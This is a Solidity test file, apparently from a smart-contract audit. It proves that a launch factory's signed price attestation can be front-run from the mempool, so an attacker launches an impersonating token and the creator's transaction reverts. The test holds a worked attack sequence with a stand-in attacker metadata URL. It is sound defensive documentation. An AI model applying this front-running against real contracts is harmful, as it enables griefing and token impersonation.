// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.26;

import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

import {StocksLaunchFactory} from "../src/StocksLaunchFactory.sol";
import {StocksGraduationPriceSweepTest} from "./StocksGraduation.priceSweep.t.sol";

/// @notice Audit round 13 (external review, doc2's results table): "Front-running the creator's price
/// attestation (createCurve) -- Anyone -- Creator blocked 3 of 3 times; attacker's token launches instead."
///
/// Confirmed real: the signed attestation StocksCurve's constructor verifies
/// (`keccak256(abi.encodePacked(factory, stockToken, price, priceTimestamp))`) binds to none of
/// (msg.sender, a nonce, a chain id) -- it's a bearer credential. StocksLaunchFactory.createCurve's replay
/// guard (`usedAttestations[keccak256(abi.encodePacked(stockToken, price, priceTimestamp))]`) is keyed the
/// same way, consuming the SAME slot regardless of who calls. Since the attestation must be submitted as
/// public transaction calldata to be used at all, anyone who observes it in the mempool (or simply anyone the
/// legitimate requester shares it with) can submit it first, permanently consuming that exact
/// (stockToken, price, priceTimestamp) attestation and leaving the intended creator's own submission of the
/// identical attestation to revert.
///
/// This does NOT let the attacker steal funds or an allocation -- createCurve mints the new TST's entire
/// supply straight to the new curve contract, not to msg.sender, so front-running confers no direct token or
/// fee benefit. The real harm is griefing (the creator's transaction reverts, wasting their gas, and they must
/// get a fresh, differently-timestamped attestation to retry) and impersonation/brand-squatting (the attacker
/// picks their own `name`/`symbol`/`metadataURI` for a curve tied to the SAME real stockToken+price the
/// creator intended, which a user navigating by stock rather than by curve address could mistake for the
/// legitimate launch).
///
/// This is the same root cause as this project's already-documented, deliberately deferred EIF-712/chain-id
/// gap (AUDIT.md: "full EIP-712 domain separation... would need the off-chain signer service upgraded in
/// lockstep, outside this repo"). A robust fix here (binding the signed message to the intended creator, or a
/// commit-reveal flow) needs either the off-chain signer or the frontend's submission flow changed in
/// lockstep -- both outside this repo's scope -- so this file documents and proves the mechanism rather than
/// attempting a partial, contracts-only patch that can't fully close it alone.
contract StocksLaunchFactoryAttestationFrontrunTest is StocksGraduationPriceSweepTest {
    address creator = address(0xC0FFEE);
    address attacker = address(0xBAD1);

    function test_AttackerCanFrontRunAndConsumeTheCreatorsOwnAttestation() public {
        uint256 price = 500e18;
        uint256 ts = vm.getBlockTimestamp();
        bytes32 h = keccak256(abi.encodePacked(address(factory), address(stock), price, ts));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_KEY, MessageHashUtils.toEthSignedMessageHash(h));
        bytes memory signature = abi.encodePacked(r, s, v);

        // The attacker observes this exact (stockToken, price, priceTimestamp, signature) -- e.g. in the
        // mempool while the creator's own createCurve call is still pending -- and submits it FIRST, with
        // their own name/symbol/metadataURI.
        vm.prank(attacker);
        (address attackerToken,) = factory.createCurve(
            "Totally Legit AAPL", "AAPL", address(stock), price, ts, signature, 30 days, "https://attacker.example/evil.json"
        );
        assertTrue(attackerToken != address(0), "attacker's front-run launch succeeds");

        // The creator's own attempt with the IDENTICAL attestation -- the one they legitimately requested --
        // now reverts. They get nothing: no launch, no refund of the wasted gas, and the attacker's
        // impersonating token is what stock+price now resolves to first.
        vm.prank(creator);
        vm.expectRevert(StocksLaunchFactory.AttestationAlreadyUsed.selector);
        factory.createCurve("Official AAPL Treasury", "AAPLT", address(stock), price, ts, signature, 30 days, "https://real-issuer.example/meta.json");
    }
}
